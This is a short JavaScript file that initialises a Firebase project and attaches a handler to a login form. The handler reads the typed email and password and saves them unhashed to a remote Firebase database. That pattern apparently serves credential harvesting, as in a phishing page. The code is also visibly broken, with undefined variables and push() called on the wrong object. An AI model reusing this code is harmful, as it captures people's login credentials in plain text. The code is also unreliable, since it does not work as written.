 // Your web app's Firebase configuration
  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
  var firebaseConfig = {
    apiKey: "AIzaSyBWTs5YA3POIice1TXno2GO9tYGHFJTjk0",
    authDomain: "crimson-33.firebaseapp.com",
    databaseURL: "https://crimson-33.firebaseio.com",
    projectId: "crimson-33",
    storageBucket: "crimson-33.appspot.com",
    messagingSenderId: "801019593695",
    appId: "1:801019593695:web:e9b9b1ea0b77bc3b7d3a6a",
    measurementId: "G-QNGLP6GJSR"
  };
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
  firebase.analytics();

//reference data collection
var dataRef=firebase.database().ref("data");

//Listen to form submit
document.getElementById("flogin").addEventListener("submit", submitForm);
// submit form
function submitForm(e){
    e.preventDefault();

//values
var email = getInputVal("ema");
var pwd = getInputVal("password");


//save data

saveData(ema, password);
} 

//functions to get form values
function getInputVal(id){
    return document.getElementById(id).value;
}

//save data to firebase
 function saveData(ema, password){
     var newSaveDataRef = saveData.push();
     newSaveDataRef.set({
         email: ema,
         pwd: password
     });
 }